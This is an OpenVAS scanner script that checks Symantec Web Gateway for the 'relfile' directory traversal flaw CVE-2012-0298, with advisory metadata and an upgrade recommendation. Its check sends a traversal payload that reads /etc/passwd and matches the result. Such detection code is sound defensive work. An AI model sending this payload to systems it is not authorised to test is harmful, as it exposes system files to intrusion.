###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_web_gateway_53444.nasl 6720 2017-07-13 14:25:27Z cfischer $
#
# Symantec Web Gateway 'relfile' Parameter Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to read arbitrary files via
directory traversal attacks and gain sensitive information.
Impact Level: Application";
tag_summary = "This host is running Symantec Web Gateway and is prone to directory
traversal vulnerability.";

tag_affected = "Symantec Web Gateway versions 5.0.x before 5.0.3";
tag_insight = "The flaw is due to an improper validation of user-supplied input
passed  via the 'relfile' parameter to the '/spywall/releasenotes.php',
which allows  attackers to read arbitrary files via a ../(dot dot) sequences.";
tag_solution = "Upgrade to Symantec Web Gateway version 5.0.3 or later
For updates refer to http://www.symantec.com/business/web-gateway";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103489";
CPE = "cpe:/a:symantec:web_gateway";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(53442);
 script_cve_id("CVE-2012-0298");
 script_tag(name:"cvss_base", value:"6.4");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
 script_version ("$Revision: 6720 $");

 script_name("Symantec Web Gateway 'relfile' Parameter Directory Traversal Vulnerability");


 script_tag(name:"last_modification", value:"$Date: 2017-07-13 16:25:27 +0200 (Thu, 13 Jul 2017) $");
 script_tag(name:"creation_date", value:"2012-05-18 10:03:57 +0200 (Fri, 18 May 2012)");
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_symantec_web_gateway_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("symantec_web_gateway/installed");
 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "affected" , value : tag_affected);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53442");
 script_xref(name : "URL" , value : "http://www.symantec.com/business/web-gateway");
 script_xref(name : "URL" , value : "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00");
 script_xref(name : "URL" , value : "http://secunia.com/advisories/49216");
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

url = string(dir, "/spywall/releasenotes.php?relfile=../../../../../etc/passwd");

if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {

  security_message(port:port);
  exit(0);

}

exit(0);
